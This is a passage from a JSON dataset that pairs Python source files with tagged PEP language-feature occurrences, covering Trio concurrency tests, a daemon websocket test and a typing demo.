_core.run(main)\n    assert len(record) >= 2\ndef test_TrioToken_run_sync_soon_after_main_crash():\n    record = []\n    async def main():\n        token = _core.current_trio_token()\n        token.run_sync_soon(lambda: record.append(\"sync-cb\"))\n        raise ValueError\n    with pytest.raises(ValueError):\n        _core.run(main)\n    assert record == [\"sync-cb\"]\ndef test_TrioToken_run_sync_soon_crashes():\n    record = set()\n    async def main():\n        token = _core.current_trio_token()\n        token.run_sync_soon(lambda: dict()[\"nope\"])\n        token.run_sync_soon(lambda: record.add(\"2nd run_sync_soon ran\"))\n        try:\n            await sleep_forever()\n        except _core.Cancelled:\n            record.add(\"cancelled!\")\n    with pytest.raises(_core.TrioInternalError) as excinfo:\n        _core.run(main)\n    assert type(excinfo.value.__cause__) is KeyError\n    assert record == {\"2nd run_sync_soon ran\", \"cancelled!\"}\nasync def test_TrioToken_run_sync_soon_FIFO():\n    N = 100\n    record = []\n    token = _core.current_trio_token()\n    for i in range(N):\n        token.run_sync_soon(lambda j: record.append(j), i)\n    await wait_all_tasks_blocked()\n    assert record == list(range(N))\ndef test_TrioToken_run_sync_soon_starvation_resistance():\n    token = None\n    record = []\n    def naughty_cb(i):\n        nonlocal token\n        try:\n            token.run_sync_soon(naughty_cb, i + 1)\n        except _core.RunFinishedError:\n            record.append((\"run finished\", i))\n    async def main():\n        nonlocal token\n        token = _core.current_trio_token()\n        token.run_sync_soon(naughty_cb, 0)\n        record.append(\"starting\")\n        for _ in range(20):\n            await _core.checkpoint()\n    _core.run(main)\n    assert len(record) == 2\n    assert record[0] == \"starting\"\n    assert record[1][0] == \"run finished\"\n    assert record[1][1] >= 19\ndef test_TrioToken_run_sync_soon_threaded_stress_test():\n    cb_counter = 0\n    def cb():\n        nonlocal cb_counter\n        cb_counter += 1\n    def stress_thread(token):\n        try:\n            while True:\n                token.run_sync_soon(cb)\n                time.sleep(0)\n        except _core.RunFinishedError:\n            pass\n    async def main():\n        token = _core.current_trio_token()\n        thread = threading.Thread(target=stress_thread, args=(token,))\n        thread.start()\n        for _ in range(10):\n            start_value = cb_counter\n            while cb_counter == start_value:\n                await sleep(0.01)\n    _core.run(main)\n    print(cb_counter)\nasync def test_TrioToken_run_sync_soon_massive_queue():\n    COUNT = 1000\n    token = _core.current_trio_token()\n    counter = [0]\n    def cb(i):\n        assert counter[0] == i\n        counter[0] += 1\n    for i in range(COUNT):\n        token.run_sync_soon(cb, i)\n    await wait_all_tasks_blocked()\n    assert counter[0] == COUNT\nasync def test_slow_abort_basic():\n    with _core.CancelScope() as scope:\n        scope.cancel()\n        with pytest.raises(_core.Cancelled):\n            task = _core.current_task()\n            token = _core.current_trio_token()\n            def slow_abort(raise_cancel):\n                result = outcome.capture(raise_cancel)\n                token.run_sync_soon(_core.reschedule, task, result)\n                return _core.Abort.FAILED\n            await _core.wait_task_rescheduled(slow_abort)\nasync def test_slow_abort_edge_cases():\n    record = []\n    async def slow_aborter():\n        task = _core.current_task()\n        token = _core.current_trio_token()\n        def slow_abort(raise_cancel):\n            record.append(\"abort-called\")\n            result = outcome.capture(raise_cancel)\n            token.run_sync_soon(_core.reschedule, task, result)\n            return _core.Abort.FAILED\n        with pytest.raises(_core.Cancelled):\n            record.append(\"sleeping\")\n            await _core.wait_task_rescheduled(slow_abort)\n        record.append(\"cancelled\")\n        await _core.checkpoint()\n        record.append(\"done\")\n    with _core.CancelScope() as outer1:\n        with _core.CancelScope() as outer2:\n            async with _core.open_nursery() as nursery:\n                nursery.start_soon(slow_aborter)\n                await wait_all_tasks_blocked()\n                assert record == [\"sleeping\"]\n                outer1.cancel()\n                assert record == [\"sleeping\", \"abort-called\"]\n                outer2.cancel()\n                assert record == [\"sleeping\", \"abort-called\"]\n                nursery.cancel_scope.shield = True\n            assert record == [\"sleeping\", \"abort-called\", \"cancelled\", \"done\"]\nasync def test_task_tree_introspection():\n    tasks = {}\n    nurseries = {}\n    async def parent():\n        tasks[\"parent\"] = _core.current_task()\n        assert tasks[\"parent\"].child_nurseries == []\n        async with _core.open_nursery() as nursery1:\n            async with _core.open_nursery() as nursery2:\n                assert tasks[\"parent\"].child_nurseries == [nursery1, nursery2]\n        assert tasks[\"parent\"].child_nurseries == []\n        async with _core.open_nursery() as nursery:\n            nurseries[\"parent\"] = nursery\n            nursery.start_soon(child1)\n        assert nurseries[\"parent\"].parent_task is tasks[\"parent\"]\n        assert tasks[\"child1\"].parent_nursery is nurseries[\"parent\"]\n        assert nurseries[\"child1\"].parent_task is tasks[\"child1\"]\n        assert tasks[\"child2\"].parent_nursery is nurseries[\"child1\"]\n        nursery = _core.current_task().parent_nursery\n        while nursery is not None:\n            t = nursery.parent_task\n            nursery = t.parent_nursery\n    async def child2():\n        tasks[\"child2\"] = _core.current_task()\n        assert tasks[\"parent\"].child_nurseries == [nurseries[\"parent\"]]\n        assert nurseries[\"parent\"].child_tasks == frozenset({tasks[\"child1\"]})\n        assert tasks[\"child1\"].child_nurseries == [nurseries[\"child1\"]]\n        assert nurseries[\"child1\"].child_tasks == frozenset({tasks[\"child2\"]})\n        assert tasks[\"child2\"].child_nurseries == []\n    async def child1():\n        tasks[\"child1\"] = _core.current_task()\n        async with _core.open_nursery() as nursery:\n            nurseries[\"child1\"] = nursery\n            nursery.start_soon(child2)\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(parent)\nasync def test_nursery_closure():\n    async def child1(nursery):\n        nursery.start_soon(child2)\n    async def child2():\n        pass\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(child1, nursery)\n    with pytest.raises(RuntimeError):\n        nursery.start_soon(child2)\nasync def test_spawn_name():\n    async def func1(expected):\n        task = _core.current_task()\n        assert expected in task.name\n    async def func2():  \n        pass\n    async with _core.open_nursery() as nursery:\n        for spawn_fn in [nursery.start_soon, _core.spawn_system_task]:\n            spawn_fn(func1, \"func1\")\n            spawn_fn(func1, \"func2\", name=func2)\n            spawn_fn(func1, \"func3\", name=\"func3\")\n            spawn_fn(functools.partial(func1, \"func1\"))\n            spawn_fn(func1, \"object\", name=object())\nasync def test_current_effective_deadline(mock_clock):\n    assert _core.current_effective_deadline() == inf\n    with _core.CancelScope(deadline=5) as scope1:\n        with _core.CancelScope(deadline=10) as scope2:\n            assert _core.current_effective_deadline() == 5\n            scope2.deadline = 3\n            assert _core.current_effective_deadline() == 3\n            scope2.deadline = 10\n            assert _core.current_effective_deadline() == 5\n            scope2.shield = True\n            assert _core.current_effective_deadline() == 10\n            scope2.shield = False\n            assert _core.current_effective_deadline() == 5\n            scope1.cancel()\n            assert _core.current_effective_deadline() == -inf\n            scope2.shield = True\n            assert _core.current_effective_deadline() == 10\n        assert _core.current_effective_deadline() == -inf\n    assert _core.current_effective_deadline() == inf\n@pytest.mark.filterwarnings(\"ignore:.*@coroutine.*:DeprecationWarning\")\ndef test_nice_error_on_bad_calls_to_run_or_spawn():\n    def bad_call_run(*args):\n        _core.run(*args)\n    def bad_call_spawn(*args):\n        async def main():\n            async with _core.open_nursery() as nursery:\n                nursery.start_soon(*args)\n        _core.run(main)\n    class Deferred:\n        \"Just kidding\"\n    with ignore_coroutine_never_awaited_warnings():\n        for bad_call in bad_call_run, bad_call_spawn:\n            async def f():  \n                pass\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(f())\n            assert \"expecting an async function\" in str(excinfo.value)\n            import asyncio\n            @asyncio.coroutine\n            def generator_based_coro():  \n                yield from asyncio.sleep(1)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(generator_based_coro())\n            assert \"asyncio\" in str(excinfo.value)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(asyncio.Future())\n            assert \"asyncio\" in str(excinfo.value)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(lambda: asyncio.Future())\n            assert \"asyncio\" in str(excinfo.value)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(Deferred())\n            assert \"twisted\" in str(excinfo.value)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(lambda: Deferred())\n            assert \"twisted\" in str(excinfo.value)\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(len, [1, 2, 3])\n            assert \"appears to be synchronous\" in str(excinfo.value)\n            @async_generator\n            async def async_gen(arg):  \n                pass\n            with pytest.raises(TypeError) as excinfo:\n                bad_call(async_gen, 0)\n            msg = \"expected an async function but got an async generator\"\n            assert msg in str(excinfo.value)\n            del excinfo\ndef test_calling_asyncio_function_gives_nice_error():\n    async def child_xyzzy():\n        import asyncio\n        await asyncio.Future()\n    async def misguided():\n        await child_xyzzy()\n    with pytest.raises(TypeError) as excinfo:\n        _core.run(misguided)\n    assert \"asyncio\" in str(excinfo.value)\n    assert any(  \n        entry.name == \"child_xyzzy\" for entry in excinfo.traceback\n    )\nasync def test_asyncio_function_inside_nursery_does_not_explode():\n    with pytest.raises(TypeError) as excinfo:\n        async with _core.open_nursery() as nursery:\n            import asyncio\n            nursery.start_soon(sleep_forever)\n            await asyncio.Future()\n    assert \"asyncio\" in str(excinfo.value)\nasync def test_trivial_yields():\n    with assert_checkpoints():\n        await _core.checkpoint()\n    with assert_checkpoints():\n        await _core.checkpoint_if_cancelled()\n        await _core.cancel_shielded_checkpoint()\n    with assert_checkpoints():\n        async with _core.open_nursery():\n            pass\n    with _core.CancelScope() as cancel_scope:\n        cancel_scope.cancel()\n        with pytest.raises(_core.MultiError) as excinfo:\n            async with _core.open_nursery():\n                raise KeyError\n        assert len(excinfo.value.exceptions) == 2\n        assert {type(e)\n                for e in excinfo.value.exceptions} == {\n                    KeyError, _core.Cancelled\n                }\nasync def test_nursery_start(autojump_clock):\n    async def no_args():  \n        pass\n    async with _core.open_nursery() as nursery:\n        with pytest.raises(TypeError):\n            await nursery.start(no_args)\n    async def sleep_then_start(\n        seconds, *, task_status=_core.TASK_STATUS_IGNORED\n    ):\n        repr(task_status)  \n        await sleep(seconds)\n        task_status.started(seconds)\n        await sleep(seconds)\n    for seconds in [1, 2]:\n        async with _core.open_nursery() as nursery:\n            assert len(nursery.child_tasks) == 0\n            t0 = _core.current_time()\n            assert await nursery.start(sleep_then_start, seconds) == seconds\n            assert _core.current_time() - t0 == seconds\n            assert len(nursery.child_tasks) == 1\n        assert _core.current_time() - t0 == 2 * seconds\n    t0 = _core.current_time()\n    await sleep_then_start(3)\n    assert _core.current_time() - t0 == 2 * 3\n    async def double_started(task_status=_core.TASK_STATUS_IGNORED):\n        task_status.started()\n        with pytest.raises(RuntimeError):\n            task_status.started()\n    async with _core.open_nursery() as nursery:\n        await nursery.start(double_started)\n    async def raise_keyerror(task_status=_core.TASK_STATUS_IGNORED):\n        raise KeyError(\"oops\")\n    async with _core.open_nursery() as nursery:\n        with pytest.raises(KeyError):\n            await nursery.start(raise_keyerror)\n    async def nothing(task_status=_core.TASK_STATUS_IGNORED):\n        return\n    async with _core.open_nursery() as nursery:\n        with pytest.raises(RuntimeError) as excinfo:\n            await nursery.start(nothing)\n        assert \"exited without calling\" in str(excinfo.value)\n    async def just_started(task_status=_core.TASK_STATUS_IGNORED):\n        task_status.started(\"hi\")\n    async with _core.open_nursery() as nursery:\n        with _core.CancelScope() as cs:\n            cs.cancel()\n            with pytest.raises(_core.Cancelled):\n                await nursery.start(just_started)\n    async def raise_keyerror_after_started(\n        task_status=_core.TASK_STATUS_IGNORED\n    ):\n        task_status.started()\n        raise KeyError(\"whoopsiedaisy\")\n    async with _core.open_nursery() as nursery:\n        with _core.CancelScope() as cs:\n            cs.cancel()\n            with pytest.raises(_core.MultiError) as excinfo:\n                await nursery.start(raise_keyerror_after_started)\n    assert {type(e)\n            for e in excinfo.value.exceptions} == {_core.Cancelled, KeyError}\n    async with _core.open_nursery() as closed_nursery:\n        pass\n    t0 = _core.current_time()\n    with pytest.raises(RuntimeError):\n        await closed_nursery.start(sleep_then_start, 7)\n    assert _core.current_time() == t0\nasync def test_task_nursery_stack():\n    task = _core.current_task()\n    assert task._child_nurseries == []\n    async with _core.open_nursery() as nursery1:\n        assert task._child_nurseries == [nursery1]\n        with pytest.raises(KeyError):\n            async with _core.open_nursery() as nursery2:\n                assert task._child_nurseries == [nursery1, nursery2]\n                raise KeyError\n        assert task._child_nurseries == [nursery1]\n    assert task._child_nurseries == []\nasync def test_nursery_start_with_cancelled_nursery():\n    async def setup_nursery(task_status=_core.TASK_STATUS_IGNORED):\n        async with _core.open_nursery() as nursery:\n            task_status.started(nursery)\n            await sleep_forever()\n    async def sleeping_children(fn, *, task_status=_core.TASK_STATUS_IGNORED):\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(sleep_forever)\n            nursery.start_soon(sleep_forever)\n            await wait_all_tasks_blocked()\n            fn()\n            task_status.started()\n    async with _core.open_nursery() as nursery:\n        target_nursery = await nursery.start(setup_nursery)\n        await target_nursery.start(\n            sleeping_children, target_nursery.cancel_scope.cancel\n        )\n    async with _core.open_nursery() as nursery:\n        target_nursery = await nursery.start(setup_nursery)\n        await target_nursery.start(sleeping_children, lambda: None)\n        target_nursery.cancel_scope.cancel()\nasync def test_nursery_start_keeps_nursery_open(autojump_clock):\n    async def sleep_a_bit(task_status=_core.TASK_STATUS_IGNORED):\n        await sleep(2)\n        task_status.started()\n        await sleep(3)\n    async with _core.open_nursery() as nursery1:\n        t0 = _core.current_time()\n        async with _core.open_nursery() as nursery2:\n            nursery1.start_soon(nursery2.start, sleep_a_bit)\n            await sleep(1)\n            nursery1.start_soon(nursery2.start, sleep_a_bit)\n        assert _core.current_time() - t0 == 6\n    async def sleep_then_crash(task_status=_core.TASK_STATUS_IGNORED):\n        await sleep(7)\n        raise KeyError\n    async def start_sleep_then_crash(nursery):\n        with pytest.raises(KeyError):\n            await nursery.start(sleep_then_crash)\n    async with _core.open_nursery() as nursery1:\n        t0 = _core.current_time()\n        async with _core.open_nursery() as nursery2:\n            nursery1.start_soon(start_sleep_then_crash, nursery2)\n            await wait_all_tasks_blocked()\n        assert _core.current_time() - t0 == 7\nasync def test_nursery_explicit_exception():\n    with pytest.raises(KeyError):\n        async with _core.open_nursery():\n            raise KeyError()\nasync def test_nursery_stop_iteration():\n    async def fail():\n        raise ValueError\n    try:\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(fail)\n            raise StopIteration\n    except _core.MultiError as e:\n        assert tuple(map(type, e.exceptions)) == (StopIteration, ValueError)\nasync def test_nursery_stop_async_iteration():\n    class it:\n        def __init__(self, count):\n            self.count = count\n            self.val = 0\n        async def __anext__(self):\n            await sleep(0)\n            val = self.val\n            if val >= self.count:\n                raise StopAsyncIteration\n            self.val += 1\n            return val\n    class async_zip:\n        def __init__(self, *largs):\n            self.nexts = [obj.__anext__ for obj in largs]\n        async def _accumulate(self, f, items, i):\n            items[i] = await f()\n        @aiter_compat\n        def __aiter__(self):\n            return self\n        async def __anext__(self):\n            nexts = self.nexts\n            items = [\n                None,\n            ] * len(nexts)\n            got_stop = False\n            def handle(exc):\n                nonlocal got_stop\n                if isinstance(exc, StopAsyncIteration):\n                    got_stop = True\n                    return None\n                else:  \n                    return exc\n            with _core.MultiError.catch(handle):\n                async with _core.open_nursery() as nursery:\n                    for i, f in enumerate(nexts):\n                        nursery.start_soon(self._accumulate, f, items, i)\n            if got_stop:\n                raise StopAsyncIteration\n            return items\n    result = []\n    async for vals in async_zip(it(4), it(2)):\n        result.append(vals)\n    assert result == [[0, 0], [1, 1]]\nasync def test_traceback_frame_removal():\n    async def my_child_task():\n        raise KeyError()\n    try:\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(my_child_task)\n            nursery.start_soon(my_child_task)\n    except _core.MultiError as exc:\n        first_exc = exc.exceptions[0]\n        assert isinstance(first_exc, KeyError)\n        frame = first_exc.__traceback__.tb_frame\n        assert frame.f_code is my_child_task.__code__\ndef test_contextvar_support():\n    var = contextvars.ContextVar(\"test\")\n    var.set(\"before\")\n    assert var.get() == \"before\"\n    async def inner():\n        task = _core.current_task()\n        assert task.context.get(var) == \"before\"\n        assert var.get() == \"before\"\n        var.set(\"after\")\n        assert var.get() == \"after\"\n        assert var in task.context\n        assert task.context.get(var) == \"after\"\n    _core.run(inner)\n    assert var.get() == \"before\"\nasync def test_contextvar_multitask():\n    var = contextvars.ContextVar(\"test\", default=\"hmmm\")\n    async def t1():\n        assert var.get() == \"hmmm\"\n        var.set(\"hmmmm\")\n        assert var.get() == \"hmmmm\"\n    async def t2():\n        assert var.get() == \"hmmmm\"\n    async with _core.open_nursery() as n:\n        n.start_soon(t1)\n        await wait_all_tasks_blocked()\n        assert var.get() == \"hmmm\"\n        var.set(\"hmmmm\")\n        n.start_soon(t2)\n        await wait_all_tasks_blocked()\ndef test_system_task_contexts():\n    cvar = contextvars.ContextVar('qwilfish')\n    cvar.set(\"water\")\n    async def system_task():\n        assert cvar.get() == \"water\"\n    async def regular_task():\n        assert cvar.get() == \"poison\"\n    async def inner():\n        async with _core.open_nursery() as nursery:\n            cvar.set(\"poison\")\n            nursery.start_soon(regular_task)\n            _core.spawn_system_task(system_task)\n            await wait_all_tasks_blocked()\n    _core.run(inner)\ndef test_Nursery_init():\n    check_Nursery_error = pytest.raises(\n        TypeError, match='no public constructor available'\n    )\n    with check_Nursery_error:\n        _core._run.Nursery(None, None)\nasync def test_Nursery_private_init():\n    async with _core.open_nursery() as nursery:\n        assert False == nursery._closed\ndef test_Nursery_subclass():\n    with pytest.raises(\n        TypeError, match='`Nursery` does not support subclassing'\n    ):\n        class Subclass(_core._run.Nursery):\n            pass\ndef test_Cancelled_init():\n    check_Cancelled_error = pytest.raises(\n        TypeError, match='no public constructor available'\n    )\n    with check_Cancelled_error:\n        raise _core.Cancelled\n    with check_Cancelled_error:\n        _core.Cancelled()\n    _core.Cancelled._create()\ndef test_Cancelled_str():\n    cancelled = _core.Cancelled._create()\n    assert str(cancelled) == 'Cancelled'\ndef test_Cancelled_subclass():\n    with pytest.raises(\n        TypeError, match='`Cancelled` does not support subclassing'\n    ):\n        class Subclass(_core.Cancelled):\n            pass\ndef test_CancelScope_subclass():\n    with pytest.raises(\n        TypeError, match='`CancelScope` does not support subclassing'\n    ):\n        class Subclass(_core.CancelScope):\n            pass\ndef test_sniffio_integration():\n    with pytest.raises(sniffio.AsyncLibraryNotFoundError):\n        sniffio.current_async_library()\n    async def check_inside_trio():\n        assert sniffio.current_async_library() == \"trio\"\n    _core.run(check_inside_trio)\n    with pytest.raises(sniffio.AsyncLibraryNotFoundError):\n        sniffio.current_async_library()\nasync def test_Task_custom_sleep_data():\n    task = _core.current_task()\n    assert task.custom_sleep_data is None\n    task.custom_sleep_data = 1\n    assert task.custom_sleep_data == 1\n    await _core.checkpoint()\n    assert task.custom_sleep_data is None\n@types.coroutine\ndef async_yield(value):\n    yield value\nasync def test_permanently_detach_coroutine_object():\n    task = None\n    pdco_outcome = None\n    async def detachable_coroutine(task_outcome, yield_value):\n        await sleep(0)\n        nonlocal task, pdco_outcome\n        task = _core.current_task()\n        pdco_outcome = await outcome.acapture(\n            _core.permanently_detach_coroutine_object, task_outcome\n        )\n        await async_yield(yield_value)\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(\n            detachable_coroutine, outcome.Value(None), \"I'm free!\"\n        )\n    assert pdco_outcome is None\n    assert task.coro.send(\"be free!\") == \"I'm free!\"\n    assert pdco_outcome == outcome.Value(\"be free!\")\n    with pytest.raises(StopIteration):\n        task.coro.send(None)\n    task = None\n    pdco_outcome = None\n    with pytest.raises(KeyError):\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(\n                detachable_coroutine, outcome.Error(KeyError()), \"uh oh\"\n            )\n    throw_in = ValueError()\n    assert task.coro.throw(throw_in) == \"uh oh\"\n    assert pdco_outcome == outcome.Error(throw_in)\n    with pytest.raises(StopIteration):\n        task.coro.send(None)\n    async def bad_detach():\n        async with _core.open_nursery():\n            with pytest.raises(RuntimeError) as excinfo:\n                await _core.permanently_detach_coroutine_object(\n                    outcome.Value(None)\n                )\n            assert \"open nurser\" in str(excinfo.value)\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(bad_detach)\nasync def test_detach_and_reattach_coroutine_object():\n    unrelated_task = None\n    task = None\n    async def unrelated_coroutine():\n        nonlocal unrelated_task\n        unrelated_task = _core.current_task()\n    async def reattachable_coroutine():\n        await sleep(0)\n        nonlocal task\n        task = _core.current_task()\n        def abort_fn(_):  \n            return _core.Abort.FAILED\n        got = await _core.temporarily_detach_coroutine_object(abort_fn)\n        assert got == \"not trio!\"\n        await async_yield(1)\n        await async_yield(2)\n        with pytest.raises(RuntimeError) as excinfo:\n            await _core.reattach_detached_coroutine_object(\n                unrelated_task, None\n            )\n        assert \"does not match\" in str(excinfo.value)\n        await _core.reattach_detached_coroutine_object(task, \"byebye\")\n        await sleep(0)\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(unrelated_coroutine)\n        nursery.start_soon(reattachable_coroutine)\n        await wait_all_tasks_blocked()\n        assert unrelated_task is not None\n        assert task is not None\n        assert task.coro.send(\"not trio!\") == 1\n        assert task.coro.send(None) == 2\n        assert task.coro.send(None) == \"byebye\"\nasync def test_detached_coroutine_cancellation():\n    abort_fn_called = False\n    task = None\n    async def reattachable_coroutine():\n        await sleep(0)\n        nonlocal task\n        task = _core.current_task()\n        def abort_fn(_):\n            nonlocal abort_fn_called\n            abort_fn_called = True\n            return _core.Abort.FAILED\n        await _core.temporarily_detach_coroutine_object(abort_fn)\n        await _core.reattach_detached_coroutine_object(task, None)\n        with pytest.raises(_core.Cancelled):\n            await sleep(0)\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(reattachable_coroutine)\n        await wait_all_tasks_blocked()\n        assert task is not None\n        nursery.cancel_scope.cancel()\n        task.coro.send(None)\n    assert abort_fn_called\ndef test_async_function_implemented_in_C():\n    ns = {\"_core\": _core}\n    try:\n        exec(\n            dedent(\n            ),\n            ns,\n        )\n    except SyntaxError:\n        pytest.skip(\"Requires Python 3.6+\")\n    else:\n        agen_fn = ns[\"agen_fn\"]\n    run_record = []\n    agen = agen_fn(run_record)\n    _core.run(agen.__anext__)\n    assert run_record == [\"the generator ran\"]\n    async def main():\n        start_soon_record = []\n        agen = agen_fn(start_soon_record)\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(agen.__anext__)\n        assert start_soon_record == [\"the generator ran\"]\n    _core.run(main)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import contextvars"
                    ],
                    [
                        1243,
                        1243,
                        "import",
                        "        import asyncio"
                    ],
                    [
                        1211,
                        1211,
                        "import",
                        "            import asyncio"
                    ],
                    [
                        1256,
                        1256,
                        "import",
                        "            import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        1455,
                        1456,
                        "async for",
                        "async for vals in async_zip(it(4), it(2)):\n        result.append(vals)"
                    ]
                ]
            }
        },
        "110": {
            "file": "import asyncio\nimport json\nimport aiohttp\nimport pytest\nfrom plotter.server.outbound_message import NodeType\nfrom plotter.server.server import ssl_context_for_server\nfrom plotter.types.peer_info import PeerInfo\nfrom plotter.util.block_tools import BlockTools\nfrom plotter.util.ints import uint16\nfrom plotter.util.ws_message import create_payload\nfrom tests.core.node_height import node_height_at_least\nfrom tests.setup_nodes import setup_daemon, self_hostname, setup_full_system\nfrom tests.simulation.test_simulation import test_constants_modified\nfrom tests.time_out_assert import time_out_assert, time_out_assert_custom_interval\nb_tools = BlockTools(constants=test_constants_modified)\nb_tools_1 = BlockTools(constants=test_constants_modified)\nnew_config = b_tools._config\nnew_config[\"daemon_port\"] = 55401\nb_tools.change_config(new_config)\nclass TestDaemon:\n    @pytest.fixture(scope=\"function\")\n    async def get_daemon(self):\n        async for _ in setup_daemon(btools=b_tools):\n            yield _\n    @pytest.fixture(scope=\"function\")\n    async def simulation(self):\n        async for _ in setup_full_system(\n            b_tools_1.constants, b_tools=b_tools, b_tools_1=b_tools_1, connect_to_daemon=True\n        ):\n            yield _\n    @pytest.mark.asyncio\n    async def test_daemon_simulation(self, simulation, get_daemon):\n        node1, node2, _, _, _, _, _, _, _, server1 = simulation\n        await server1.start_client(PeerInfo(self_hostname, uint16(21238)))\n        async def num_connections():\n            count = len(node2.server.connection_by_type[NodeType.FULL_NODE].items())\n            return count\n        await time_out_assert_custom_interval(60, 1, num_connections, 1)\n        await time_out_assert(1500, node_height_at_least, True, node2, 1)\n        session = aiohttp.ClientSession()\n        crt_path = b_tools.root_path / b_tools.config[\"daemon_ssl\"][\"private_crt\"]\n        key_path = b_tools.root_path / b_tools.config[\"daemon_ssl\"][\"private_key\"]\n        ca_cert_path = b_tools.root_path / b_tools.config[\"private_ssl_ca\"][\"crt\"]\n        ca_key_path = b_tools.root_path / b_tools.config[\"private_ssl_ca\"][\"key\"]\n        ssl_context = ssl_context_for_server(ca_cert_path, ca_key_path, crt_path, key_path)\n        ws = await session.ws_connect(\n            \"wss://127.0.0.1:55401\",\n            autoclose=True,\n            autoping=True,\n            heartbeat=60,\n            ssl_context=ssl_context,\n            max_msg_size=100 * 1024 * 1024,\n        )\n        service_name = \"test_service_name\"\n        data = {\"service\": service_name}\n        payload = create_payload(\"register_service\", data, service_name, \"daemon\")\n        await ws.send_str(payload)\n        message_queue = asyncio.Queue()\n        async def reader(ws, queue):\n            while True:\n                msg = await ws.receive()\n                if msg.type == aiohttp.WSMsgType.TEXT:\n                    message = msg.data.strip()\n                    message = json.loads(message)\n                    await queue.put(message)\n                elif msg.type == aiohttp.WSMsgType.PING:\n                    await ws.pong()\n                elif msg.type == aiohttp.WSMsgType.PONG:\n                    continue\n                else:\n                    if msg.type == aiohttp.WSMsgType.CLOSE:\n                        await ws.close()\n                    elif msg.type == aiohttp.WSMsgType.ERROR:\n                        await ws.close()\n                    elif msg.type == aiohttp.WSMsgType.CLOSED:\n                        pass\n                    break\n        read_handler = asyncio.create_task(reader(ws, message_queue))\n        data = {}\n        payload = create_payload(\"get_blockchain_state\", data, service_name, \"plotter_full_node\")\n        await ws.send_str(payload)\n        await asyncio.sleep(5)\n        blockchain_state_found = False\n        while not message_queue.empty():\n            message = await message_queue.get()\n            if message[\"command\"] == \"get_blockchain_state\":\n                blockchain_state_found = True\n        await ws.close()\n        read_handler.cancel()\n        assert blockchain_state_found",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        22,
                        24,
                        "async generator",
                        "async def get_daemon(self):\n        async for _ in setup_daemon(btools=b_tools):\n            yield _"
                    ],
                    [
                        26,
                        30,
                        "async generator",
                        "async def simulation(self):\n        async for _ in setup_full_system(\n            b_tools_1.constants, b_tools=b_tools, b_tools_1=b_tools_1, connect_to_daemon=True\n        ):\n            yield _"
                    ],
                    [
                        23,
                        24,
                        "async for",
                        "async for _ in setup_daemon(btools=b_tools):\n            yield _"
                    ],
                    [
                        27,
                        30,
                        "async for",
                        "async for _ in setup_full_system(\n            b_tools_1.constants, b_tools=b_tools, b_tools_1=b_tools_1, connect_to_daemon=True\n        ):\n            yield _"
                    ]
                ]
            }
        },
        "111": {
            "file": "import asyncio\nfrom typing import AsyncGenerator, AsyncIterator, List, Literal\nasync def get_data() -> List[int]:\n    await asyncio.sleep(1)\n    return [1, 2, 3]\nasync def generate(nums: List[int]) -> AsyncGenerator[str, None]:\n    for n in nums:\n        await asyncio.sleep(1)\n        yield f\"The number is {n}\"\nasync def get_generator1() -> AsyncGenerator[str, None]:\n    data = await get_data()\n    v1 = generate(data)\n    t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)\n    return v1\nasync def get_generator2() -> AsyncIterator[str]:\n    data = await get_data()\n    v1 = generate(data)\n    t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)\n    return v1\nasync def demo_bug1() -> None:\n    v1 = get_generator1()\n    t_v1: Literal[\"Coroutine[Any, Any, AsyncGenerator[str, None]]\"] = reveal_type(v1)\n    gen = await v1\n    t_gen: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(gen)\n    async for s in gen:\n        print(s)\nasync def demo_bug2() -> None:\n    v1 = get_generator2()\n    t_v1: Literal[\"Coroutine[Any, Any, AsyncIterator[str]]\"] = reveal_type(v1)\n    gen = await v1\n    t_gen: Literal[\"AsyncIterator[str]\"] = reveal_type(gen)\n    async for s in gen:\n        print(s)\nloop = asyncio.get_event_loop()\nloop.run_until_complete(demo_bug1())\nloop.run_until_complete(demo_bug2())",
            "patterns": {
                "pep_526": [
                    [
                        13,
                        "t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)"
                    ],
                    [
                        18,
                        "t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)"
                    ],
                    [
                        22,
                        "t_v1: Literal[\"Coroutine[Any, Any, AsyncGenerator[str, None]]\"] = reveal_type(v1)"
                    ],
                    [
                        24,
                        "t_gen: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(gen)"
                    ],
                    [
                        29,
                        "t_v1: Literal[\"Coroutine[Any, Any, AsyncIterator[str]]\"] = reveal_type(v1)"
                    ],
                    [
                        31,
                        "t_gen: Literal[\"AsyncIterator[str]\"] = reveal_type(gen)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        2,
                        "from typing import AsyncGenerator, AsyncIterator, List, Literal",
                        "suggestion"
                    ]
                ],
                "pep_586": [
                    [
                        2,
                        "from typing import AsyncGenerator, AsyncIterator, List, Literal",
                        "import"
                    ],
                    [
                        13,
                        "    t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)",
                        "type annotation"
                    ],
                    [
                        18,
                        "    t_v1: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(v1)",
                        "type annotation"
